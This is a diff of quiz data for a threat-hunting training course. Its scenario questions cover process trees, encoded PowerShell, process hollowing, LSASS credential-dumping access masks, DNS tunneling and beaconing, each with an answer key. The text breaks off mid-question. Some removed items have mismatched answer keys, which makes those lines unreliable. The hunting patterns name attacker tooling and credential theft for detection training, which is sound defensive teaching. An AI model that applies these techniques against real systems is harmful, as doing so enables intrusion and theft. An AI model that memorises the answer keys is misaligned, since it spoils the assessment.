+                  "The anomalous parent-child chain: an Office app spawning a shell that spawns encoded PowerShell is a textbook macro/loader pattern — hunt on Office_App → cmd|powershell|wscript|mshta with encoded flags across the fleet",
+                  "PowerShell is banned outright",
+                  "WINWORD is deprecated"
+              ],
+              correctAnswer: 1,
+              explanation: "The signal is the chain, not any single binary. Office apps almost never legitimately spawn shells with encoded payloads. This is the canonical initial-access to execution pivot."
+          },
+          {
+              id: "th-q3-3",
+              difficulty: "medium",
+              tags: ["JA3/JA3S"],
+              scenario: "Proxy logs are blind to payloads (TLS 1.3), but Zeek is capturing ssl.log with JA3/JA3S. You see JA3 `72a589da586844d7f0818ce684948eea` beaconing every 63s from 14 endpoints to disparate IPs and domains.",
+              question: "What is the value of the JA3 fingerprint here?",
+              options: [
+                  "None — TLS is encrypted",
+                  "JA3 hashes the TLS client-hello parameters, so the same client library/tool produces the same JA3 across different destinations — perfect for pivoting on tooling (e.g., a specific implant) independent of C2 rotation",
+                  "It reveals the certificate CN",
+                  "It only works on HTTP"
+              ],
+              correctAnswer: 1,
+              explanation: "JA3 pivots on the client stack. A rare JA3 across many endpoints beaconing on a fixed cadence is a strong C2 signal — infrastructure can rotate but the client fingerprint persists until the operator retools."
+          },
+          {
+              id: "th-q3-4",
+              difficulty: "medium",
+              tags: ["Process Hollowing"],
+              scenario: "EDR telemetry shows svchost.exe started with `CREATE_SUSPENDED`, then WriteProcessMemory + SetThreadContext + ResumeThread from an unrelated parent.",
+              question: "Which technique is this and what is the durable hunt?",
+              options: [
+                  "Normal service start",
+                  "Process hollowing (T1055.012); hunt for CreateProcess(SUSPENDED) followed by WriteProcessMemory/NtUnmapViewOfSection + SetThreadContext against target images that legitimately never get hollowed (svchost, notepad, RegAsm)",
+                  "A debugger session",
+                  "Antivirus quarantine"
+              ],
+              correctAnswer: 1,
+              explanation: "The API sequence Create(SUSPENDED) → Unmap/Write → SetContext → Resume is the hollowing signature. Hunting the API pattern on common target binaries survives obfuscation of the loader itself."
+          },
+          {
+              id: "th-q3-5",
+              difficulty: "medium",
+              tags: ["MITRE ATT&CK Tactics"],
+              scenario: "You catch an actor creating a scheduled task `\\Microsoft\\Windows\\Defender\\Refresh` that runs a payload from ProgramData every 60 minutes.",
+              question: "Which tactic is this, and what is the correct hunt query family?",
+              options: [
+                  "Impact — hunt for encryption",
+                  "Persistence (T1053.005 Scheduled Task); hunt EID 4698/Sysmon 4702/schtasks.exe with task paths mimicking Microsoft, non-Microsoft-signed action binaries, and tasks created by non-admin sessions",
+                  "Reconnaissance — hunt DNS",
+                  "Exfiltration — hunt uploads"
+              ],
+              correctAnswer: 1,
+              explanation: "Scheduled tasks are the #1 non-registry persistence. Hunt on task path masquerading + action binary signature + creator identity — not on the mere existence of scheduled tasks."
+          },
+          {
+              id: "th-q3-6",
+              difficulty: "medium",
+              tags: ["DLL Side-loading"],
+              scenario: "A signed vendor executable in `C:\\ProgramData\\Vendor\\app.exe` loads `version.dll` from its own directory instead of System32. The DLL is unsigned and 47 KB.",
+              question: "What is this, and what is the fleet-wide hunt?",
+              options: [
+                  "Normal DLL loading",
+                  "DLL search-order hijack / side-loading (T1574.002); hunt Sysmon EID 7 for known-signed images loading unsigned DLLs with common Windows names (version.dll, dbghelp.dll, winhttp.dll) from non-System32 paths, then stack-rank rare pairs",
+                  "A Windows Update",
+                  "A driver signing bypass"
+              ],
+              correctAnswer: 1,
+              explanation: "Side-loading abuses the DLL search order. The generalizable hunt is 'signed EXE loading unsigned same-name Windows DLL from its own folder' — stack-ranked rare pairs surface novel abuses."
+          },
+          {
+              id: "th-q3-7",
+              difficulty: "medium",
+              tags: ["Fileless"],
+              scenario: "PowerShell EID 4104 shows a large base64 blob decoded and executed via `[Reflection.Assembly]::Load($bytes)`. No file is written.",
+              question: "What class of technique is this, and what is the primary telemetry to hunt on?",
+              options: [
+                  "It cannot be detected",
+                  "Reflective/in-memory .NET load (T1055/T1620); hunt Script Block Logging (4104) + AMSI events + Sysmon Image Load of clr.dll into unusual hosts (e.g., powershell_ise, wscript) with high-entropy blobs",
+                  "It is a file infector",
+                  "It is a boot sector attack"
+              ],
+              correctAnswer: 1,
+              explanation: "Fileless execution defeats disk AV, but AMSI + Script Block Logging + CLR image-load telemetry make it very hunt-able. Entropy and unusual CLR hosts are the strongest signals."
+          },
+          {
+              id: "th-q3-8",
+              difficulty: "hard",
+              tags: ["Timestomping"],
+              scenario: "You find `payload.exe` in `C:\\Windows\\System32\\` with $STANDARD_INFORMATION Created = 2009-07-14 (matches Windows install date), but $FILE_NAME Created = last Tuesday. MFT record number is very recent.",
+              question: "What has happened and how do you generalize the hunt?",
+              options: [
+                  "Legitimate system file",
+                  "Timestomping (T1070.006): $SI is trivially settable while $FN is written by the kernel on rename/create; hunt for files where $SI < $FN or where timestamps cluster on suspicious round values, prioritizing System32 and recent MFT records",
+                  "Filesystem corruption",
+                  "A clock drift issue"
+              ],
+              correctAnswer: 1,
+              explanation: "$SI vs $FN divergence is the classic timestomp tell. The MFT record number gives ground truth for actual creation order — durable regardless of what the attacker sets."
+          },
+          {
+              id: "th-q3-9",
+              difficulty: "hard",
+              tags: ["Sysmon Config"],
+              scenario: "Your Sysmon config logs process creation but excludes command lines >2KB for 'performance'. Attackers move to giant encoded PowerShell one-liners and your hunts go blind.",
+              question: "What is the correct fix and hunt compensation?",
+              options: [
+                  "Leave the exclusion — performance matters more",
+                  "Remove the cmdline length exclusion (it is directly exploited as an evasion); enable EID 4104 Script Block Logging, EID 1 with full cmdline, and add a hunt for extreme cmdline lengths and high base64 ratios as a first-class signal",
+                  "Disable Sysmon",
+                  "Only log EID 3"
+              ],
+              correctAnswer: 1,
+              explanation: "Any deterministic filter in Sysmon becomes an evasion primitive. Adversaries deliberately shape traffic below or above thresholds. Extreme cmdline length + entropy is itself a hunt signal."
+          },
+          {
+              id: "th-q3-10",
+              difficulty: "hard",
+              tags: ["Living-off-the-Cloud"],
+              scenario: "C2 traffic is going to `raw.githubusercontent.com` and `bin.pastes.dev`. Proxy allows both. No malware on disk.",
+              question: "What is the tradecraft and the correct hunt?",
+              options: [
+                  "Developers being developers — ignore",
+                  "Living-off-Trusted-Sites / dead-drop resolvers: hunt for non-developer endpoints (finance/HR) fetching raw content from code/paste sites, endpoints polling at fixed intervals, and processes other than browsers/dev tools issuing these requests",
+                  "Block GitHub for the whole company",
+                  "Trust the TLS cert"
+              ],
+              correctAnswer: 1,
+              explanation: "Trusted-site abuse defeats reputation and TLS inspection. The hunt is contextual: who is asking, from which process, on what cadence — not the destination alone."
+          }
+      ]
   },
   {
-    quizId: "th-q4",
-    courseId: "threat-hunting",
-    title: "Endpoint Hunting",
-    description: "Test your skills in hunting for threats on endpoints using process trees, autoruns, and memory analysis.",
-    passingScore: 70,
-    timeLimit: 15,
-    questions: [
-      { id: "th-q4-1", question: "What is the most important artifact to examine when hunting on endpoints?", options: ["Desktop wallpaper and user interface personalization settings for anomaly detection", "Process execution and parent-child relationships, revealing suspicious spawn chains", "Screen resolution and display scaling settings configured in user profile preferences", "Installed fonts and language pack configurations imported during system provisioning"], correctAnswer: 1, explanation: "Process trees reveal anomalous parent-child relationships, like Word spawning PowerShell, which indicate malicious activity." },
-      { id: "th-q4-2", question: "Which parent process spawning cmd.exe is suspicious?", options: ["explorer.exe — the normal Windows shell that legitimately spawns cmd.exe for user tasks", "services.exe — the Windows Service Control Manager which manages all background services", "winword.exe — Microsoft Word spawning cmd.exe is highly suspicious macro-based execution", "cmd.exe — a cmd.exe spawning another cmd.exe for chained scripting is routine behavior"], correctAnswer: 2, explanation: "Microsoft Word (winword.exe) spawning cmd.exe is highly suspicious — it suggests macro-based malware execution." },
-      { id: "th-q4-3", question: "What are 'autoruns' in the context of endpoint hunting?", options: ["Automatic software update mechanisms that download patches from vendor update servers", "Scheduled scan configurations that trigger automated malware analysis at preset intervals", "Auto-reply email rules configured in Outlook for out-of-office message automation", "Persistence mechanisms such as registry keys and startup entries that execute code at login"], correctAnswer: 3, explanation: "Autoruns are registry keys, startup folders, scheduled tasks, and services that execute automatically — common persistence locations." },
-      { id: "th-q4-4", question: "Which tool is commonly used to enumerate Windows autorun locations?", options: ["Wireshark — a network protocol analyzer used for capturing and inspecting packets live", "Nmap — a network discovery and port scanning tool for mapping active hosts and services", "Burp Suite — a web application security testing proxy for intercepting HTTP/HTTPS traffic", "Sysinternals Autoruns — comprehensively lists all auto-starting Windows persistence locations"], correctAnswer: 0, explanation: "Sysinternals Autoruns comprehensively lists all auto-starting locations in Windows for persistence analysis." },
-      { id: "th-q4-5", question: "What does an unsigned binary running from a temp directory suggest?", options: ["Normal background software behavior from a trusted application vendor update process", "Potential malware — legitimate software is typically signed and installed in standard locations", "A routine operating system maintenance task writing temporary processing files to disk", "An expected scheduled backup agent operation copying data to a staging directory"], correctAnswer: 1, explanation: "Unsigned binaries in temp directories are a strong indicator of malware — legitimate software is typically signed and installed in standard locations." },
-      { id: "th-q4-6", question: "What is 'stack ranking' in endpoint hunting?", options: ["Ranking individual analysts on a performance leaderboard based on alert closure metrics", "Sorting and prioritizing security patches based on their CVSS score and exploitability rating", "Counting frequency of endpoint artifacts to surface rare or anomalous values for investigation", "Stacking and reassembling captured network packets to reconstruct full session payloads"], correctAnswer: 2, explanation: "Stack ranking counts how often specific values appear — rare values (process names, paths, hashes) are more likely malicious." },
-      { id: "th-q4-7", question: "Which Windows event ID logs process creation?", options: ["4624 — logs successful authentication and account logon events to the Windows Security log", "4720 — logs new user account creation events when performed by local or domain administrators", "4688 — logs process creation with process name, PID, parent PID, and command-line arguments", "1102 — logs Security audit log clearing events performed by administrator account sessions"], correctAnswer: 3, explanation: "Event ID 4688 logs process creation with details like process name, PID, and parent PID when auditing is enabled." },
-      { id: "th-q4-8", question: "What is a suspicious indicator in scheduled task hunting?", options: ["Scheduled tasks created and signed by official Microsoft Group Policy configuration management", "Tasks that run standard Windows Update binaries from the System32 directory at midnight", "Tasks published by official Microsoft hardware driver update and distribution infrastructure", "Tasks running binaries from user-writable directories with encoded PowerShell command lines"], correctAnswer: 1, explanation: "Scheduled tasks executing from user-writable paths with encoded PowerShell commands are strong persistence indicators." },
-      { id: "th-q4-9", question: "What is 'memory forensics' useful for in hunting?", options: ["Physically increasing system RAM capacity by installing additional memory modules in slots", "Detecting fileless malware, injected code, and hidden processes invisible to disk analysis", "Upgrading server hardware specifications to support additional virtual machine workloads", "Freeing disk space by clearing temporary files and unused application data caches"], correctAnswer: 1, explanation: "Memory forensics captures running processes, injected code, network connections, and artifacts invisible to disk-based analysis." },
-      { id: "th-q4-10", question: "Which tool is widely used for memory forensics?", options: ["Microsoft Excel — for parsing and analyzing structured CSV data exports from endpoint logs", "Volatility — the industry-standard open-source memory forensics framework for investigation", "Notepad — for manually reviewing plain-text memory dump outputs and raw log files", "Microsoft Paint — for creating visual process tree diagrams from memory analysis outputs"], correctAnswer: 0, explanation: "Volatility is the industry-standard open-source framework for memory forensics, supporting process, network, and malware analysis." }
-    ]
+      quizId: "th-q4",
+      courseId: "threat-hunting",
+      title: "Endpoint Hunting",
+      description: "Applied endpoint tradecraft: process trees, autoruns, event IDs, and memory forensics under real telemetry.",
+      passingScore: 70,
+      timeLimit: 20,
+      questions: [
+          {
+              id: "th-q4-1",
+              difficulty: "easy",
+              tags: ["Process Trees"],
+              scenario: "You are handed 24 hours of raw Sysmon EID 1 from 3,000 endpoints (~40M events) and told 'find evil'.",
+              question: "What is the highest-yield first pass?",
+              options: [
+                  "Look at every event",
+                  "Aggregate on parent→child pairs, stack-rank ascending, and hunt the long tail of rare pairs (e.g., winword→cmd, sqlservr→whoami, spoolsv→powershell)",
+                  "Filter to signed binaries only",
+                  "Query for the word 'malware'"
+              ],
+              correctAnswer: 1,
+              explanation: "Least-frequency-of-occurrence on parent-child is the workhorse endpoint hunt. Attackers must eventually create anomalous ancestry that has no legitimate business analogue."
+          },
+          {
+              id: "th-q4-2",
+              difficulty: "easy",
+              tags: ["Suspicious Parents"],
+              scenario: "Which of the following process pairs is the strongest indicator of compromise on a Windows workstation?",
+              question: "Pick the most suspicious pair.",
+              options: [
+                  "explorer.exe → chrome.exe",
+                  "services.exe → svchost.exe",
+                  "winword.exe → cmd.exe → powershell.exe -w hidden -enc ...",
+                  "cmd.exe → ipconfig.exe"
+              ],
+              correctAnswer: 2,
+              explanation: "Office → shell → hidden encoded PowerShell is the textbook macro-loader chain. The others are all expected system behavior."
+          },
+          {
+              id: "th-q4-3",
+              difficulty: "easy",
+              tags: ["Autoruns"],
+              scenario: "You need to enumerate persistence on a suspect host without an EDR agent installed.",
+              question: "Which single tool covers the most persistence surface?",
+              options: [
+                  "Task Manager",
+                  "Sysinternals Autoruns — enumerates Run keys, services, drivers, scheduled tasks, WMI subscriptions, LSA providers, AppInit_DLLs, image hijacks, Office add-ins, and more, with signature checks and VT lookup",
+                  "regedit alone",
+                  "netstat"
+              ],
+              correctAnswer: 1,
+              explanation: "Autoruns is the canonical persistence enumerator. Pair with 'Hide Microsoft-signed' to collapse to the long tail worth reviewing."
+          },
+          {
+              id: "th-q4-4",
+              difficulty: "medium",
+              tags: ["Unsigned + Temp"],
+              scenario: "An unsigned 62KB PE named `svchost.exe` runs from `C:\\Users\\Public\\Downloads\\` with parent `explorer.exe`, then makes an outbound TLS connection to a 3-day-old domain.",
+              question: "Which properties together give this its very high suspicion score?",
+              options: [
+                  "Only the domain age",
+                  "Masquerading (system name in user path) + unsigned + user-writable location + young infrastructure + non-service parent — no single one is proof, but the combination is a high-fidelity behavioral cluster",
+                  "Only that it is 62KB",
+                  "Only the parent process"
+              ],
+              correctAnswer: 1,
+              explanation: "Hunting compounds weak signals into strong composites. Any one property is noisy; the combination is nearly deterministic — this is the basis for behavioral scoring detections."
+          },
+          {
+              id: "th-q4-5",
+              difficulty: "medium",
+              tags: ["Stack Ranking"],
+              scenario: "You want to find rare service binaries across 10,000 hosts. Most services are Microsoft-signed and appear on ~all hosts.",
+              question: "How do you stack-rank correctly?",
+              options: [
+                  "Count events per host — highest wins",
+                  "Group by (image path, signer, size) and count DISTINCT hosts; sort ascending; the services present on the fewest hosts (long tail) are the hunt targets",
+                  "Only look at services on one host",
+                  "Ignore signing"
+              ],
+              correctAnswer: 1,
+              explanation: "Distinct-host counts prevent a single noisy machine from skewing rankings. Least-common-across-fleet is the anomaly you want."
+          },
+          {
+              id: "th-q4-6",
+              difficulty: "medium",
+              tags: ["EID 4688 vs Sysmon EID 1"],
+              scenario: "You have both native Windows Security EID 4688 (with cmdline auditing enabled) and Sysmon EID 1.",
+              question: "Which offers more hunt value and why?",
+              options: [
+                  "They are identical",
+                  "Sysmon EID 1 — adds file hashes (MD5/SHA1/SHA256/IMPHASH), original filename, parent image full path, ProcessGUID for durable pivoting, signature status, and richer parent lineage; 4688 lacks these",
+                  "4688 — only official Microsoft event",
+                  "Neither — use ETW only"
+              ],
+              correctAnswer: 1,
+              explanation: "Sysmon's added fields (especially IMPHASH and ProcessGUID) enable pivots that raw 4688 cannot. Best practice is to run both."
+          },
+          {
+              id: "th-q4-7",
+              difficulty: "medium",
+              tags: ["Scheduled Tasks"],
+              scenario: "New scheduled task `\\Microsoft\\Windows\\UpdateOrchestrator\\Reboot-Aux` running `wscript.exe C:\\Users\\bob\\AppData\\Roaming\\upd.js` every 47 minutes, created by user 'bob'.",
+              question: "What are the three strongest suspicion signals?",
+              options: [
+                  "It runs every 47 minutes only",
+                  "Microsoft-path masquerading + action binary in user-writable AppData + created by an interactive user account (not SYSTEM/admin/GPO) — combined this is high-fidelity persistence",
+                  "wscript.exe is banned",
+                  "The task name is too long"
+              ],
+              correctAnswer: 1,
+              explanation: "Path masquerading, user-writable payload, and unusual creator identity are the durable signals. Hunt on the combination via EID 4698 and TaskCache registry."
+          },
+          {
+              id: "th-q4-8",
+              difficulty: "hard",
+              tags: ["Memory Forensics"],
+              scenario: "EDR is blind to a suspected in-memory implant. You have a full memory image and Volatility 3.",
+              question: "Which plugin sequence best surfaces injected/fileless code?",
+              options: [
+                  "windows.pslist only",
+                  "windows.pslist + windows.psscan (unlinked) + windows.malfind (RWX private regions with PE headers) + windows.ldrmodules (unlinked DLLs) + windows.netscan (hidden connections)",
+                  "windows.filescan only",
+                  "windows.registry.hivelist only"
+              ],
+              correctAnswer: 1,
+              explanation: "malfind + ldrmodules + psscan cross-check the loader for injected code and unlinked artifacts; netscan surfaces sockets missed by live tools. This is the standard implant hunt in Volatility."
+          },
+          {
+              id: "th-q4-9",
+              difficulty: "hard",
+              tags: ["WMI Persistence"],
+              scenario: "You suspect a __EventFilter → __EventConsumer → __FilterToConsumerBinding persistence chain on 4 hosts.",
+              question: "Where do you hunt, and what is the most durable telemetry?",
+              options: [
+                  "Only Security EID 4624",
+                  "Microsoft-Windows-WMI-Activity/Operational EID 5861 (permanent event consumer created) + querying root\\subscription classes remotely; Sysmon EID 19/20/21 also captures WMI subscription events with cmdline context",
+                  "DNS logs",
+                  "Firewall logs"
+              ],
+              correctAnswer: 1,
+              explanation: "WMI-Activity 5861 and Sysmon 19-21 are the canonical WMI persistence signals. Hunt across every host for any 5861 that is not from a known GPO/imaging pipeline."
+          },
+          {
+              id: "th-q4-10",
+              difficulty: "hard",
+              tags: ["LSASS Access"],
+              scenario: "Sysmon EID 10: source=`rundll32.exe`, target=`lsass.exe`, GrantedAccess=0x1010, CallTrace includes `UNKNOWN` module in RWX memory.",
+              question: "What is happening and what is the safest hunt query family?",
+              options: [
+                  "Windows crash reporting",
+                  "Credential dumping (T1003.001) via reflective loader; hunt EID 10 targeting lsass with GrantedAccess masks 0x1010/0x1410/0x1438 and unsigned/unknown-module CallTrace, from any non-allowlisted source process — tune, do not disable",
+                  "Nothing suspicious",
+                  "Chrome auto-update"
+              ],
+              correctAnswer: 1,
+              explanation: "The GrantedAccess mask (VMRead|PROCESS_QUERY_INFO) plus UNKNOWN CallTrace module is a well-known Mimikatz-family signal. LSASS access hunts are noisy but tunable via caller allowlisting."
+          }
+      ]
   },
   {
-    quizId: "th-q5",
-    courseId: "threat-hunting",
-    title: "Network & Cloud Hunting",
-    description: "Assess your ability to hunt threats across network traffic and cloud environments.",
-    passingScore: 70,
-    timeLimit: 15,
-    questions: [
-      { id: "th-q5-1", question: "What is DNS beaconing?", options: ["Standard recursive DNS resolution queries performed by local client browsers to load website assets", "Malware periodically querying an external command and control server domain at regular time intervals", "Routine DNS server replication and zone transfer operations between primary and secondary name servers", "Automatic dynamic updates of client hostname records within local Active Directory DNS databases"], correctAnswer: 1, explanation: "DNS beaconing is malware communicating with C2 via periodic DNS queries, often at suspiciously regular intervals." },
-      { id: "th-q5-2", question: "Which network artifact helps detect DNS tunneling?", options: ["Extremely short DNS query names targeting local domain controllers or internal intranet resources", "Standard DNS pointer record lookup requests attempting to resolve IP addresses back to hostnames", "Routine lease renewal requests sent to local DHCP servers to extend IP address configuration times", "Unusually long and complex DNS query names exhibiting high character entropy and random subdomains"], correctAnswer: 3, explanation: "DNS tunneling encodes data in query names, resulting in unusually long, high-entropy subdomain strings." },
-      { id: "th-q5-3", question: "What is a 'long tail' analysis in network hunting?", options: ["Analyzing rare and infrequent network connections that deviate significantly from baseline traffic", "Measuring physical network cable runs and identifying optimal paths for routing copper connection lines", "Calculating packet transfer latencies and identifying bottlenecks in core routing infrastructure", "Monitoring aggregate bandwidth utilization to identify departments consuming excessive data volumes"], correctAnswer: 0, explanation: "Long tail analysis focuses on rare connections — the uncommon destinations or patterns that are statistically anomalous and potentially malicious." },
-      { id: "th-q5-4", question: "Which protocol is commonly abused for data exfiltration due to being rarely inspected?", options: ["High-speed User Datagram Protocol (UDP) media streaming sessions that are typically blocked at boundaries", "Internal Remote Desktop Protocol (RDP) sessions that are actively monitored by network security tools", "Common protocols like DNS, HTTP, and SMTP which are typically permitted through firewalls with minimal audit", "Encrypted SSH tunnel sessions established exclusively between validated internal administrative servers"], correctAnswer: 2, explanation: "DNS, HTTP, HTTPS, and SMTP are all commonly abused — DNS is particularly stealthy since it's rarely blocked or deeply inspected." },
-      { id: "th-q5-5", question: "In cloud hunting, what is the most critical log source?", options: ["Application-specific server logs that track user session logins and internal application database queries", "Cloud provider audit activity logs such as AWS CloudTrail or Azure Activity Log tracking API operations", "Workstation operating system event logs tracking local process executions and file write operations", "Local print spooler logs recording document print jobs sent from user workstations to local printers"], correctAnswer: 1, explanation: "Cloud audit logs (AWS CloudTrail, Azure Activity Log, GCP Audit Logs) record all API calls and are essential for cloud hunting." },
-      { id: "th-q5-6", question: "What does an unusually high volume of outbound traffic to a single IP suggest?", options: ["Potential data exfiltration activity where sensitive corporate assets are transferred to external systems", "Routine data backup processes transferring scheduled file archives to local storage vaults on segment", "Automatic background operating system update tasks downloading large patches from verified servers", "Standard corporate email delivery processes queueing outbound messages to internal SMTP gateways"], correctAnswer: 0, explanation: "Large outbound transfers to a single IP, especially outside business hours, are a strong exfiltration indicator." },
-      { id: "th-q5-7", question: "What is 'east-west traffic' in network hunting?", options: ["Global internet traffic traversing continental boundaries through undersea fiber optic communication links", "Inbound traffic originating from public web clients accessing external-facing web applications in DMZs", "Internal network communications representing lateral movement of hosts and traffic between internal systems", "Outbound internet browsing traffic originating from internal user workstations accessing web servers"], correctAnswer: 2, explanation: "East-west traffic is internal lateral communication — hunting here reveals lateral movement after initial compromise." },
-      { id: "th-q5-8", question: "Which cloud-specific threat involves misconfigured storage buckets?", options: ["Distributed Denial of Service (DDoS) attacks targeting public-facing load balancers with volume traffic", "Coordinated phishing campaigns targeting cloud administration credentials via deceptive login portals", "Automated brute force login attempts targeting exposed cloud management consoles and API endpoints", "Unintentional data exposure through publicly accessible cloud storage buckets like AWS S3 or Azure Blobs"], correctAnswer: 3, explanation: "Misconfigured cloud storage (open S3 buckets, Azure Blobs) is a major cloud threat causing data exposure." },
-      { id: "th-q5-9", question: "What is 'impossible travel' detection in cloud environments?", options: ["Detecting active VPN configurations and anonymizing proxy servers used to mask user source IP addresses", "Flagging user authentication events occurring from distant geographical locations in impossible timelines", "Analyzing travel reservation booking patterns of executive staff members to prevent physical targeting", "Monitoring and auditing internal employee travel expense reimbursement claims for suspicious activity"], correctAnswer: 1, explanation: "Impossible travel flags when a user logs in from two distant locations faster than physically possible, indicating credential compromise." },
-      { id: "th-q5-10", question: "What network hunting technique examines TLS certificate anomalies?", options: ["Analyzing individual network packet sizes and payload lengths to identify hidden command signatures", "Checking hardware MAC address tables on local network switches to detect unauthorized physical devices", "Analyzing TLS certificate transparency logs and detecting self-signed certs used by C2 infrastructure", "Monitoring local VLAN configuration updates to identify unauthorized port assignments and access routes"], correctAnswer: 2, explanation: "Analyzing TLS certificates for self-signed certs, unusual issuers, or short validity periods helps detect C2 infrastructure." }
-    ]
+      quizId: "th-q5",
+      courseId: "threat-hunting",
+      title: "Network & Cloud Hunting",
+      description: "Applied network and cloud tradecraft: beaconing, DNS tunneling, east-west lateral movement, and control-plane abuse.",
+      passingScore: 70,
+      timeLimit: 20,
+      questions: [
+          {
+              id: "th-q5-1",
+              difficulty: "easy",
+              tags: ["Beaconing"],
+              scenario: "Zeek conn.log shows host 10.42.7.19 connecting to 91.234.55.77:443 every 60±3 seconds for 6 hours, average 812 bytes out / 1.1KB in per connection.",
+              question: "What is the primary hunt signal and how do you generalize it?",
+              options: [
+                  "Cron job — safe",
+                  "Periodic beaconing with low jitter and small, symmetric payload size; generalize by computing inter-arrival time coefficient of variation per (src, dst, port) and alerting on low CoV + long duration + small bytes",
+                  "Windows Update",
+                  "NTP"
+              ],
+              correctAnswer: 1,
+              explanation: "The durable behavioral signal is low temporal variance over many intervals with small, uniform payloads. CoV of inter-arrival times is the standard statistical hunt."
+          },
+          {
+              id: "th-q5-2",
+              difficulty: "easy",
+              tags: ["DNS Tunneling"],
+              scenario: "DNS logs show queries like `a3b8c1d9e7...f4.tun.example[.]net` where the leftmost label averages 48 chars and Shannon entropy 4.8 bits/char, at ~14 queries/second from one host.",
+              question: "What are you seeing and what is the fleet hunt?",
+              options: [
+                  "CDN lookups",
+                  "DNS tunneling: hunt per-host distinct-subdomain counts, mean label length, label entropy, and QPS to any single 2LD; alert on top percentile — durable regardless of the specific TXT/A/CNAME encoding used",
+                  "Anti-virus updates",
+                  "reverse DNS"
+              ],
+              correctAnswer: 1,
+              explanation: "Length, entropy, per-2LD subdomain cardinality, and QPS together are the canonical DNS-tunneling signal. Payload-specific rules miss variants."
+          },
+          {
+              id: "th-q5-3",
+              difficulty: "medium",
+              tags: ["Long-tail"],
+              scenario: "You aggregate proxy logs by destination domain over 30 days across 20k users. 99% of traffic goes to ~5,000 domains. The remaining 1% goes to 380,000 unique domains, mostly one-request-ever.",
+              question: "Where does hunting value concentrate and why?",
+              options: [
+                  "The top 5,000 — most traffic",
+                  "The long tail: rare/one-off destinations are where DGA, exfil dead-drops, and single-victim C2 hide; enrich with domain age, WHOIS, ASN reputation, and unique-user count to prioritize",
+                  "Middle of the distribution",
+                  "Random sample"
+              ],
+              correctAnswer: 1,
+              explanation: "The head is your business baseline; the tail is where adversary infrastructure hides by design. Enrichment collapses 380k into a triageable few hundred."
+          },
+          {
+              id: "th-q5-4",
+              difficulty: "medium",
+              tags: ["Egress Protocols"],
+              scenario: "Your egress firewall allows DNS to anywhere, HTTPS to anywhere via proxy (no MITM), and blocks everything else outbound.",
+              question: "Where is exfiltration most likely to hide and how do you monitor it?",
+              options: [
+                  "SSH — but it is blocked",
+                  "DNS (rarely deeply inspected) and HTTPS (encrypted, allowed to trusted sites); monitor DNS with volumetric/entropy analytics per host, and HTTPS via JA3/SNI/upload-byte anomalies and destination reputation",
+                  "IRC",
+                  "SMB to the internet"
+              ],
+              correctAnswer: 1,
+              explanation: "Adversaries follow policy: they exfil through whatever is permitted. DNS and HTTPS are the two universally permitted egress channels and therefore the two universal hunt surfaces."
+          },
+          {
+              id: "th-q5-5",
+              difficulty: "medium",
+              tags: ["Cloud Audit Logs"],
+              scenario: "You are asked to hunt for cloud identity abuse across AWS, Azure, and GCP.",
+              question: "What is the single most important log source in each?",
+              options: [
+                  "VPC Flow only",
+                  "AWS CloudTrail (management events), Azure Activity Log + Entra ID Sign-In/Audit, GCP Cloud Audit Logs (Admin Activity + Data Access) — the control-plane API record is the ground truth for identity and configuration abuse",
+                  "OS logs on the VMs",
+                  "Billing logs"
+              ],
+              correctAnswer: 1,
+              explanation: "Cloud attacks are API attacks. The provider control-plane audit log is the definitive record — VPC/flow and OS logs are complementary, not substitutes."
+          },
+          {
+              id: "th-q5-6",
+              difficulty: "medium",
+              tags: ["Data Exfil"],
+              scenario: "One workstation uploads 8 GB over TLS to a single IP between 02:00 and 04:00 local time. Normal daily upload for that host is <80 MB.",
+              question: "What is the hunt signal set?",
+              options: [
+                  "Upload volume alone is not evidence",
+                  "Composite: upload-bytes z-score vs per-host baseline + out-of-hours + single-destination concentration + destination reputation/age — one-signal alerts on volume alone are noisy; the composite is high-fidelity",
+                  "Ignore — probably a backup",
+                  "Alert on any TLS upload"
+              ],
+              correctAnswer: 1,
+              explanation: "Per-host baselining is essential; a 100x deviation combined with off-hours and destination context is the standard exfil hunt. Static thresholds either miss or drown you."
+          },
+          {
+              id: "th-q5-7",
+              difficulty: "medium",
+              tags: ["East-West"],
+              scenario: "Your NDR is entirely north-south. An adversary lands via phishing and moves via SMB and WinRM between workstations for weeks.",
+              question: "What is the fix and the primary hunt?",
+              options: [
+                  "Buy more north-south sensors",
+                  "Instrument east-west telemetry (TAPs at core, Zeek on internal segments, Windows 5140/5145 SMB share access, WinRM/WSMan 6/91, Sysmon EID 3 for internal dest); hunt for workstation→workstation SMB/RPC/WinRM which is abnormal in most environments",
+                  "Ignore internal traffic",
+                  "Only monitor DCs"
+              ],
+              correctAnswer: 1,
+              explanation: "Lateral movement is invisible without east-west visibility. Workstation-to-workstation admin protocols are rare by policy and a high-fidelity lateral-movement signal."
+          },
+          {
+              id: "th-q5-8",
+              difficulty: "hard",
+              tags: ["Cloud Misconfig"],
+              scenario: "You need to continuously hunt for newly-public S3 buckets and Azure blob containers across 42 accounts/subscriptions.",
+              question: "What is the correct hunt architecture?",
+              options: [
+                  "Manual weekly review",
+                  "CloudTrail/Activity event-driven detection on PutBucketAcl/PutBucketPolicy/SetContainerAcl API calls that result in Public/AllUsers grants, plus periodic drift scans via config service (AWS Config / Azure Policy / GCP SCC) — event + posture together",
+                  "Trust the developers",
+                  "Only scan production"
+              ],
+              correctAnswer: 1,
+              explanation: "Event-driven detection catches misconfigurations at the moment of change; posture management catches drift and historic state. Both are needed."
+          },
+          {
+              id: "th-q5-9",
+              difficulty: "hard",
+              tags: ["Impossible Travel"],
+              scenario: "Entra ID sign-in log: user@corp signed in from Berlin at 09:00 UTC and Seoul at 09:20 UTC — implied ground speed ~28,000 km/h.",
+              question: "What is the correct handling, given both sessions used the same corporate laptop UA?",
+              options: [
+                  "Reset password immediately without checking",
+                  "Treat as high-severity credential/session compromise candidate but first enrich with IP → ASN (VPN/proxy?), device compliance, MFA claim, session token reuse (same refresh_token in both?); impossible travel + token replay = confirmed AiTM/token theft",
+                  "Ignore — probably a VPN",
+                  "Wait for the user to complain"
+              ],
+              correctAnswer: 1,
+              explanation: "Impossible-travel alone has FPs from VPNs. Pair with token/session artifacts to distinguish benign VPN egress from adversary-in-the-middle token replay — a rising 2025 pattern."
+          },
+          {
+              id: "th-q5-10",
+              difficulty: "hard",
+              tags: ["TLS Cert Anomalies"],
+              scenario: "You pull cert observations from Zeek x509.log for 30 days: most certs are LetsEncrypt or DigiCert, valid 90+ days. You spot 42 destinations serving self-signed certs with subject CN 'localhost' and 7-day validity.",
+              question: "What is the hunt logic?",
+              options: [
+                  "Self-signed always means malware",
